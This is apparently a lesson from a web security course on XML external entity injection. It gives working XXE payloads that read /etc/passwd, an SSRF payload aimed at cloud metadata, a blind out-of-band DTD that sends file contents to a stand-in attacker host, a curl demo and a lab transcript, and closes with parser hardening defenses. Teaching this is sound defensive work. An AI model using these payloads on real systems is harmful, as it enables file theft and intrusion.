---
title: "Lesson 8.3: XML External Entity Injection"
image:
  path: /assets/img/covers/web-8-3-xml-external-entity-injection.webp
  alt: "XML External Entity Injection"
date: 2024-06-15 16:15:00 +0700
categories: ["Web Security", "Web · Template and Deserialization"]
tags: [web, xxe, ssrf]
render_with_liquid: false
---

By the end of this lesson you can use the DTD of an XML document to read files on the server, send SSRF requests, and pull data through a blind out-of-band channel when the response returns nothing. XXE appears anywhere a server parses XML that a user sent.

![XML External Entity Injection](/assets/img/web/web-8-3-xml-external-entity-injection.svg)
_An external entity declared with SYSTEM points the parser at file:// or http://, and the resolved value lands in the echoed field._

Part: 8 (Template and Deserialization) | Time: about 50 minutes | Difficulty: advanced

**Prerequisites:** HTTP and an app that accepts data in XML form.

**Tools:** curl, Burp Suite, interactsh or Burp Collaborator (for OOB).

## Goals

After this lesson you understand DTDs and external entities in XML. You can read system files through XXE (`file://`), use XXE for SSRF (calling an internal URL), understand blind XXE OOB with parameter entities and an external DTD, and build a lab that reads a real `/etc/passwd`.

## 1. Theory

XML allows you to declare a DTD (Document Type Definition), and inside it an ENTITY: a kind of variable that is substituted when the parser processes the document. Internal entities are harmless, but an **external entity** lets an entity point at an external resource through `SYSTEM`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<contact><name>&xxe;</name></contact>
```

If the parser resolves external entities, every place that uses `&xxe;` is replaced with the contents of `/etc/passwd`. An app that echoes the `name` field back then leaks the whole file. This is XXE. It happens anywhere a server parses XML that a user sent: SOAP, SAML, RSS, sitemaps, Office files (docx and xlsx are zips that contain XML), APIs that accept `Content-Type: application/xml`, and upload configurations.

The root of the bug is parser configuration. Many older parsers (old libxml2) resolve entities by default, and many libraries let the developer enable this without understanding the consequences.

### Three directions of exploitation

- **File read (in-band):** as above, usable when the app reflects the parsed content back in the response.
- **SSRF:** change `file://` to `http://`:

  ```xml
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
  ```

  The server then makes the request to that URL itself. Use it to reach cloud metadata, internal services, or ports that only listen on loopback (following on from the SSRF material in Part 6).

- **Blind OOB (out-of-band):** when the response does not return the entity content, you pull the data through an external channel. The technique uses a parameter entity (`%name;`, usable only inside a DTD) combined with an external DTD hosted on the attacker's server:

  ```xml
  <!DOCTYPE r [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
    %dtd;
  ]>
  ```

  The file `evil.dtd` defines an entity that joins the file contents into a URL pointing back at the attacker's server, and that server reads the data from the incoming request. Use Burp Collaborator or interactsh as the receiver. This is how you handle "silent" XXE that does not respond.

## 2. Demo

```text
# send XML with an external entity (remember the XML Content-Type)
curl -X POST -H "Content-Type: application/xml" --data-binary @payload.xml http://target/contact

# payload.xml
<?xml version="1.0"?>
<!DOCTYPE contact [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<contact><name>&xxe;</name><msg>test</msg></contact>
```

One practical note that matters: you must send `Content-Type: application/xml` (or text/xml) and use `--data-binary`. If you leave the default `x-www-form-urlencoded`, many frameworks (such as Flask) swallow the body into the form and the parser receives an empty string.

## 3. Lab

- Vulnerable app: `labs/8.3/` (Flask + lxml, run `python3 app.py`, listening on `127.0.0.1:8066`).
- Task: read `/etc/passwd` through XXE.
- Hint: the endpoint `POST /contact` parses XML with a parser that has `resolve_entities=True`, then echoes the `name` field back.
- Solution: `labs/8.3/exploit.sh` and `labs/8.3/transcript.txt`.

Real transcript excerpt:

```text
=== [1] XXE doc /etc/passwd qua external entity SYSTEM file:// ===
Cam on lien he!
--- name ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
haipanda:x:1000:1000:,,,:/home/haipanda:/bin/bash
```

## 4. Common pitfalls

- Sending the wrong Content-Type, which leaves the body empty and makes you think the app is not affected.
- Entities often do not run in the internal DTD subset on some parsers for blind cases, so you must use a parameter entity and an external DTD.
- Defense (root cause): disable DTDs and external entities. lxml: `etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)`. Python: use `defusedxml` instead of the default parser. Java: `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`. Old PHP: `libxml_disable_entity_loader(true)` (newer PHP is safer by default). .NET: do not use the default `XmlResolver`.

## 5. Further reading

- PortSwigger Web Security Academy: XML external entity (XXE) injection.
- OWASP: XML External Entity Prevention Cheat Sheet.
- PayloadsAllTheThings: XXE Injection.

## 6. Key takeaways

- When an app accepts XML, try XXE: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
- Remember to send `Content-Type: application/xml` plus `--data-binary`.
- Use `file://` to read files and `http://` for SSRF.
- A silent response means moving to blind OOB: parameter entity plus external DTD plus Collaborator.
- XML hides inside SOAP, SAML, RSS, docx and xlsx, and sitemaps.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 8.3</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-web/8.3.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-web/8.3/app.py" download><i class="fa-solid fa-file-code"></i>app.py</a>
<a class="lab-file" href="/assets/labs-web/8.3/exploit.sh" download><i class="fa-solid fa-file-code"></i>exploit.sh</a>
</div>
</div>
